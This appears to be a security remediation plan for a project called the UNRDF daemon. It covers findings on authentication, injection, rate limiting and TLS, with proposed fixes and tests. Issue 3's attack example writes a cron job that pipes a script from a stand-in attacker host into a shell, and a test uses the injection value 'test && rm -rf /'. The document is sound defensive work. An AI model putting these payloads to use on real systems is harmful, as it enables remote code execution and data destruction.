# Security Remediation Plan - UNRDF Daemon
**Target**: Production-ready security posture
**Timeline**: 30 days
**Owner**: Development Team

---

## Critical Findings (Fix Immediately - 24-48 hours)

### Issue 1: Security Module Not Integrated
**Risk**: 🔴 CRITICAL (9.8/10)
**Status**: ❌ OPEN

**Problem**: The `security-audit.mjs` module (605 lines) exists with comprehensive validation but is NEVER imported or used in production code.

**Evidence**:
```bash
$ grep -r "validateInputSafety\|validatePayload" packages/daemon/src/ --exclude="security-audit.mjs"
# Result: 0 matches - security functions not used anywhere!
```

**Impact**:
- All 13 integration modules vulnerable to injection attacks
- 41,857+ LOC exposed (from commit 0018f46c)
- False sense of security (tests pass but production unprotected)

**Fix**:
```javascript
// packages/daemon/src/daemon.mjs (ADD THIS)
import { validatePayload, checkRateLimit } from './security-audit.mjs';

async execute(operationId, context = {}) {
  // 1. Validate input
  const validation = validatePayload(operationId, {
    type: 'command',
    checkPath: true,
    rateLimitId: context.userId || 'anonymous',
    maxRequests: 100,
    windowMs: 60000
  });

  if (!validation.valid) {
    throw new Error(`Security validation failed: ${validation.reason}`);
  }

  // 2. Proceed with execution
  // ... existing code
}
```

**Verification**:
```bash
# After fix, this should return matches:
grep -r "validateInputSafety\|validatePayload" packages/daemon/src/ | wc -l
# Expected: 10+ matches across integration files
```

**Assignee**: Backend Team
**Due Date**: 2026-01-12 (tomorrow)

---

### Issue 2: No Authentication Layer
**Risk**: 🔴 CRITICAL (9.8/10)
**Status**: ❌ OPEN

**Problem**: ANY caller can execute ANY operation - no authentication required.

**Attack Scenario**:
```javascript
// Attacker (no credentials needed):
await fetch('http://daemon:3000/execute', {
  method: 'POST',
  body: JSON.stringify({
    operationId: 'delete-all-data'  // No authentication check!
  })
});
// Result: Data deleted, no audit trail
```

**Fix** (Phase 1 - Simple API Key):
```javascript
export class DaemonAuthMiddleware {
  constructor(apiKeys) {
    this.validKeys = new Set(apiKeys); // From secure vault
  }

  authenticate(request) {
    const apiKey = request.headers['x-api-key'];

    if (!apiKey) {
      throw new Error('API key required');
    }

    if (!this.validKeys.has(apiKey)) {
      throw new Error('Invalid API key');
    }

    return { authenticated: true };
  }
}

// Usage:
const auth = new DaemonAuthMiddleware(process.env.VALID_API_KEYS.split(','));

async execute(operationId, request) {
  auth.authenticate(request); // Throws if invalid
  // ... proceed
}
```

**Fix** (Phase 2 - JWT for Production):
```javascript
import jwt from 'jsonwebtoken';

export class JWTAuthService {
  constructor(secret) {
    this.secret = secret; // From secure vault
  }

  verify(token) {
    try {
      const payload = jwt.verify(token, this.secret, {
        algorithms: ['HS256'],
        issuer: 'unrdf-daemon',
        maxAge: '1h'
      });
      return { userId: payload.sub, roles: payload.roles };
    } catch (error) {
      throw new Error('Invalid or expired token');
    }
  }
}
```

**Assignee**: Security Team
**Due Date**: 2026-01-13 (2 days)

---

### Issue 3: Injection Attacks Unprotected
**Risk**: 🔴 HIGH (8.5/10)
**Status**: ❌ OPEN

**Problem**: Delta operations allow arbitrary values without validation.

**Attack Scenario**:
```javascript
// Path traversal attack:
await deltaGate.proposeDelta({
  operations: [{
    op: 'set',
    path: '../../../../etc/cron.d/backdoor',
    newValue: '* * * * * root curl http://attacker.com/shell.sh | sh'
  }]
});
// Result: Malware scheduled to run every minute
```

**Fix**:
```javascript
// packages/daemon/src/integrations/v6-deltagate.mjs
import { validatePathSafety, validateInputSafety } from '../security-audit.mjs';

_applyOperations(operations) {
  try {
    for (const op of operations) {
      // CRITICAL: Validate path
      const pathCheck = validatePathSafety(op.path);
      if (!pathCheck.safe) {
        return { success: false, reason: pathCheck.reason };
      }

      // CRITICAL: Validate value
      const valueCheck = validateInputSafety(
        op.newValue || op.value,
        'command'
      );
      if (!valueCheck.safe) {
        return { success: false, reason: valueCheck.reason };
      }

      // Now safe to apply
      switch (op.op) {
        case 'set':
          this.store.set(op.path, op.newValue);
          break;
        // ...
      }
    }
    return { success: true };
  } catch (error) {
    return { success: false, reason: error.message };
  }
}
```

**Assignee**: Backend Team
**Due Date**: 2026-01-13 (2 days)

---

## High Priority (Fix within 7 days)

### Issue 4: Information Leakage via Error Messages
**Risk**: 🟡 MEDIUM (6.5/10)
**Status**: ❌ OPEN

**Problem**: Stack traces and file paths leaked to clients.

**Fix**:
```javascript
// packages/daemon/src/errors.mjs (CREATE NEW FILE)
import crypto from 'crypto';

export class SecurityError extends Error {
  constructor(message, internalError = null) {
    super(message);
    this.name = 'SecurityError';
    this.errorId = crypto.randomUUID();
    this.timestamp = Date.now();

    // Log full error internally
    if (internalError) {
      console.error('[Security]', {
        errorId: this.errorId,
        stack: internalError.stack,
        message: internalError.message
      });
    }
  }

  toJSON() {
    // ONLY expose safe info to clients
    return {
      error: this.message,
      errorId: this.errorId,
      timestamp: this.timestamp
      // NO stack, NO file paths, NO internal details
    };
  }
}

// Replace all error handling:
catch (error) {
  throw new SecurityError('Operation failed', error);
  // NOT: throw error; ← NEVER expose raw errors!
}
```

**Assignee**: Backend Team
**Due Date**: 2026-01-15

---

### Issue 5: No Rate Limiting on Endpoints
**Risk**: 🟡 MEDIUM (6.0/10)
**Status**: ❌ OPEN

**Problem**: DoS attacks possible via request flooding.

**Fix**:
```javascript
// Already implemented in security-audit.mjs, just need to USE it:
import { checkRateLimit } from './security-audit.mjs';

async execute(operationId, context = {}) {
  const identifier = context.userId || context.ip || 'anonymous';

  const limit = checkRateLimit(identifier, 100, 60000); // 100 req/min

  if (!limit.allowed) {
    const retryAfter = Math.ceil((limit.resetAfter - Date.now()) / 1000);
    throw new Error(`Rate limit exceeded. Retry after ${retryAfter}s`);
  }

  // ... proceed with execution
}
```

**Assignee**: Backend Team
**Due Date**: 2026-01-16

---

## Medium Priority (Fix within 30 days)

### Issue 6: No TLS/HTTPS Enforcement
**Risk**: 🟡 MEDIUM (6.8/10)
**Status**: ❌ OPEN

**Problem**: Unencrypted communication allows MITM attacks.

**Fix**:
```javascript
// packages/daemon/src/server.mjs
import https from 'https';
import fs from 'fs';

const tlsOptions = {
  key: fs.readFileSync(process.env.TLS_KEY_PATH),
  cert: fs.readFileSync(process.env.TLS_CERT_PATH),
  minVersion: 'TLSv1.3',
  ciphers: [
    'TLS_AES_256_GCM_SHA384',
    'TLS_CHACHA20_POLY1305_SHA256'
  ].join(':'),
  honorCipherOrder: true
};

const server = https.createServer(tlsOptions, app);
server.listen(443);

// Redirect HTTP to HTTPS
import http from 'http';
http.createServer((req, res) => {
  res.writeHead(301, {
    Location: `https://${req.headers.host}${req.url}`
  });
  res.end();
}).listen(80);
```

**Assignee**: DevOps Team
**Due Date**: 2026-02-10

---

### Issue 7: Receipt Timestamp Validation Missing
**Risk**: 🟢 LOW (3.5/10)
**Status**: ❌ OPEN

**Problem**: Receipts don't validate monotonically increasing timestamps.

**Fix**:
```javascript
// packages/daemon/src/integrations/receipts-merkle.mjs
async verifyChain(receipts) {
  let prevTimestamp = 0n;

  for (const receipt of receipts) {
    // Verify monotonicity
    if (receipt.timestamp_ns <= prevTimestamp) {
      tamperedReceipts.push({
        receiptId: receipt.id,
        reason: 'Timestamp not increasing (possible tampering)'
      });
    }
    prevTimestamp = receipt.timestamp_ns;
  }

  // ... rest of validation
}
```

**Assignee**: Backend Team
**Due Date**: 2026-02-05

---

## Testing Requirements

### Security Integration Tests (REQUIRED)

Create: `packages/daemon/test/security-integration.test.mjs`

```javascript
import { describe, it, expect } from 'vitest';
import { Daemon } from '../src/daemon.mjs';
import { DaemonDeltaGate } from '../src/integrations/v6-deltagate.mjs';

describe('Security Integration Tests', () => {
  describe('Input Validation', () => {
    it('should reject path traversal in operations', async () => {
      const daemon = new Daemon();
      daemon.schedule({
        id: '../../../../etc/passwd',
        handler: () => {}
      });

      await expect(daemon.execute('../../../../etc/passwd'))
        .rejects.toThrow('Path traversal');
    });

    it('should reject command injection in delta values', async () => {
      const gate = new DaemonDeltaGate();
      const maliciousDelta = {
        id: crypto.randomUUID(),
        timestamp_ns: BigInt(Date.now() * 1_000_000),
        timestamp_iso: new Date().toISOString(),
        operations: [{
          op: 'set',
          path: 'test',
          newValue: 'test && rm -rf /',
          timestamp_ns: BigInt(Date.now() * 1_000_000)
        }],
        source: { package: '@unrdf/test' },
        previousDeltaId: null
      };

      await expect(gate.proposeDelta(maliciousDelta))
        .rejects.toThrow('injection');
    });
  });

  describe('Authentication', () => {
    it('should reject unauthenticated execute calls', async () => {
      const daemon = new Daemon();
      daemon.schedule({ id: 'test', handler: () => {} });

      await expect(daemon.execute('test', { authToken: null }))
        .rejects.toThrow('Authentication required');
    });

    it('should reject invalid API keys', async () => {
      const daemon = new Daemon();
      daemon.schedule({ id: 'test', handler: () => {} });

      await expect(daemon.execute('test', { apiKey: 'invalid' }))
        .rejects.toThrow('Invalid API key');
    });
  });

  describe('Rate Limiting', () => {
    it('should enforce rate limits', async () => {
      const daemon = new Daemon();
      daemon.schedule({ id: 'test', handler: () => {} });

      // Execute 101 times (limit is 100/min)
      for (let i = 0; i < 101; i++) {
        try {
          await daemon.execute('test', { userId: 'test-user' });
        } catch (error) {
          if (i === 100) {
            expect(error.message).toContain('Rate limit exceeded');
          }
        }
      }
    });
  });

  describe('Error Sanitization', () => {
    it('should not leak stack traces to clients', async () => {
      const daemon = new Daemon();
      daemon.schedule({
        id: 'test',
        handler: () => { throw new Error('Internal error with /secret/path'); }
      });

      try {
        await daemon.execute('test');
      } catch (error) {
        const json = error.toJSON ? error.toJSON() : error;
        expect(json.stack).toBeUndefined();
        expect(json.message).not.toContain('/secret/path');
        expect(json.errorId).toBeDefined();
      }
    });
  });
});
```

**Run Tests**:
```bash
timeout 30s pnpm test security-integration.test.mjs
# Expected: All tests pass
```

---

## Security Checklist (Pre-Deployment)

**Mark ✅ when complete**:

### Phase 1: Critical Security (Week 1)
- [ ] Security module integrated in all 13 modules
- [ ] Authentication layer implemented (API keys minimum)
- [ ] Injection validation on all inputs
- [ ] Path traversal checks on file operations
- [ ] Rate limiting enforced on execute()
- [ ] Error sanitization (SecurityError class)
- [ ] Security integration tests passing (20+ tests)

### Phase 2: High Priority (Week 2)
- [ ] JWT authentication for production
- [ ] RBAC policies defined and enforced
- [ ] TLS 1.3 minimum enforced
- [ ] HTTPS redirect configured
- [ ] Security headers added (HSTS, CSP, etc.)
- [ ] Audit logging for security events

### Phase 3: Medium Priority (Week 3-4)
- [ ] Receipt timestamp validation
- [ ] Receipt expiration (90-day TTL)
- [ ] Security monitoring dashboard
- [ ] Alerting for suspicious activity
- [ ] Penetration testing completed
- [ ] Security documentation updated

### Phase 4: Production Ready (Week 5)
- [ ] Security review by external auditor
- [ ] Load testing with security enabled
- [ ] Incident response plan documented
- [ ] Vulnerability disclosure program
- [ ] Security training for team
- [ ] Compliance requirements met

---

## Verification Commands

**Run these to verify security posture**:

```bash
# 1. Check security module integration
grep -r "from.*security-audit" packages/daemon/src/ --include="*.mjs" | wc -l
# Expected: 10+ (one per integration module)

# 2. Run security tests
timeout 30s pnpm test security-audit.test.mjs
timeout 30s pnpm test security-integration.test.mjs
# Expected: 100% pass rate

# 3. Check for hardcoded secrets
grep -r "password\|secret\|api.*key" packages/daemon/src/ --include="*.mjs" -i
# Expected: 0 matches

# 4. Dependency audit
pnpm audit
# Expected: 0 vulnerabilities

# 5. Static analysis
pnpm lint
# Expected: 0 security violations

# 6. Check TLS configuration
curl -I https://daemon.example.com
# Expected: Strict-Transport-Security header present
```

---

## Risk Acceptance (If Unable to Fix Immediately)

If remediation must be delayed, document:

```markdown
## Risk Acceptance: [Issue Name]
**Risk Level**: [CRITICAL/HIGH/MEDIUM/LOW]
**Accepted By**: [Name, Title]
**Date**: 2026-01-11
**Reason**: [Business justification]
**Compensating Controls**:
- [Control 1: e.g., Network isolation]
- [Control 2: e.g., Enhanced monitoring]
**Review Date**: [30 days from acceptance]
**Target Remediation**: [Date when fix will be implemented]
```

---

## Contact & Escalation

**Security Team**:
- Lead: [Name] (email@example.com)
- Engineer: [Name] (email@example.com)

**Escalation**:
- P0 (Critical): Immediate notification + incident response
- P1 (High): Daily standup + weekly review
- P2 (Medium): Sprint planning
- P3 (Low): Backlog grooming

**Report Security Issues**:
- Internal: security@unrdf.example.com
- External: security.txt file (create per RFC 9116)

---

## Success Criteria

**Security posture is production-ready when**:
1. ✅ All P0 and P1 issues remediated (verified)
2. ✅ Security integration tests 100% passing
3. ✅ External penetration test completed (no critical findings)
4. ✅ Static analysis clean (0 security violations)
5. ✅ Dependency audit clean (0 high/critical CVEs)
6. ✅ TLS/HTTPS enforced with A+ rating (SSL Labs)
7. ✅ Authentication/authorization on all operations
8. ✅ Rate limiting preventing DoS (load tested)
9. ✅ Audit logging capturing all security events
10. ✅ Incident response plan tested and documented

**Target Date**: 2026-02-10 (30 days)

---

**End of Remediation Plan**
